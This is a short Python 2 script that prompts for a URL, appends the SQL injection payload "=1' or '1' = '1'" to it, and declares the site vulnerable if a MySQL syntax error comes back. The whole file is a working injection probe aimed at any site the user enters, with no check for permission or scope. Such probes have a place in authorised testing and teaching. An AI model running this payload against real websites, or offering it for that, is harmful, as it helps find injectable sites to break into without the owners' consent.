import sys
import urllib
from urllib2 import urlopen

fullurl = raw_input("Please enter URL: ")

resp = urlopen(fullurl + "=1\' or \'1\' = \'1\'")
body = resp.read()
fullbody = body.decode('utf-8')

if "You have an error in your SQL syntax" in fullbody:
    print ("Website is vulnerable")
else:
    print ("Website is not vulnerable");